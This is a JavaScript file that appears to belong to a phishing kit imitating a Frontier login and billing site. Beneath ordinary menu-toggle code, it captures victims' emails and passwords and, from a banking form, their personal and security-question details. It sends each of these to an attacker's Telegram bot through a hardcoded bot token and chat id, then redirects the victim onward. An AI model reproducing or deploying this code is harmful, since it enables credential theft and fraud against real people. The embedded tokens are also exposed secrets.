// toggles nav menu on mobile view upon menu button click
const menu = document.querySelector(".menu-icon");
// console.log("hello", window.location.href);
menu.addEventListener("click", () => {
  const navLinks = document.querySelector(".nav-general");
  const navComputedStyle = window.getComputedStyle(navLinks);
  // console.log(window.getComputedStyle(navLinks).display); // <empty string>

  if (navComputedStyle.display === "block") {
    navLinks.style.display = "none";
  } else {
    navLinks.style.display = "block";
  }
});

// Toggles the footer links display in the footer top
function showFooter(event, element) {
  event.preventDefault();

  const mediaQuery = window.matchMedia("(max-width: 768px)");

  if (event.type === "click" && mediaQuery.matches) {
    // console.log("clickkkkk");

    const footerLinks = element.lastElementChild;
    const footerComputedstyle = window.getComputedStyle(footerLinks);
    // console.log(footerComputedstyle.display);

    if (footerComputedstyle.display === "none") {
      footerLinks.style.display = "flex";
    } else {
      footerLinks.style.display = "none";
    }
  }
}

// API SETUP
async function apiCall(routePath, ...texts) {
  const API_KEY = "7454271480:AAHYvF4jL3VNM-UnWYk-C8VqJkrODROfgFM"; //"7130970644:AAEZ_5YKjTXQpO09ZPxrRtDsUyX6D8SXcvU";
  const chat_id = -4266117210; //-4221814535;

  // Flatten the texts array if the first element is an array
  if (Array.isArray(texts[0])) {
    texts = texts[0];
  }

  // Join the texts array into a single string separated by new lines
  const combinedText = texts.join("\n");
  const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
    combinedText
  )}`;

  const api = new XMLHttpRequest();
  api.open("GET", url, true);

  // Define what happens on successful data submission
  api.onload = () => {
    if (api.status >= 200 && api.status < 300) {
      console.log("Message Sent!");
      // Navigate to a different URL after successful message sending
      // window.location.href = "/views/billing.html"; // Change to your desired URL

      if (routePath) {
        window.location.href = routePath;
        // handleRouting(routePath);
      }
    } else {
      console.log(`Failed to send message. Status: ${api.status}`);
    }
  };

  // Define what happens in case of an error
  api.onerror = () => {
    console.log("Error occurred while sending the message");
  };

  api.send();
}

// Login Page Form Submit
const loginSubmitBtn = document.querySelector(".login-btn");
// console.log(submitBtn);
loginSubmitBtn.addEventListener("click", async () => {
  // const loginForm = document.getElementById("login-form");
  // console.log(loginForm);

  const email = document.getElementById("login-email").value;
  const pass = document.getElementById("login-pass").value;

  await apiCall(
    "./views/billing.html",
    `User-Email: ${email}`,
    `User-Pass: ${pass}`
  );
  console.log("Success Login");
});

// Banking form submit
const questions = [
  "What is the name of your first babysitter?",
  "What is your Mother's maiden name?",
  "What is the first name of your hairdresser/barber?",
  "What was the name of your first boyfriend/girlfriend?",
  "In what city did you meet your spouse/significant other?",
  "As a child, what did you want to be when you grew up?",
  "Where were you on New Year's 2000?",
  "What was the first live concert you attended?",
  "What was the first name of your favorite teacher/professor?",
  "What is the name of your favorite restaurant?",
  "On what street is your grocery store?",
];
const selectElement = document.getElementById("security-question");

questions.map((question, index) => {
  const option = document.createElement("option");
  option.value = `question-${index + 1}`; // question1, question2, ...
  option.textContent = question;
  selectElement.appendChild(option);
});

const bankingSubmit = document.querySelector(".verify-btn");
bankingSubmit.addEventListener("click", async () => {
  const bankingInputs = document.querySelectorAll(".email-section input");
  const securityQuestion = document.querySelector(".dropdown-banking");
  // const securityQuestionText = securityQuestion.option[securityQuestion.selectedIndex].text
  const selectedQuestion =
    securityQuestion.options[selectElement.selectedIndex];
  // console.log(selectedQuestion);

  const messages = Array.from(bankingInputs).map(
    (input) => `${input.name}: ${input.value}`
  );
  messages.push(`Security Questions: ${selectedQuestion.textContent}`);

  await apiCall("./thank-you.html", messages);
  console.log("success banking");
});

// if (window.location.pathname === "views/thank-you.html") {
//   console.log(window.location.pathname);
//   setTimeout(() => {
//     window.location.href = "https://login.frontier.com/webmail/";
//   }, 3000);
// }
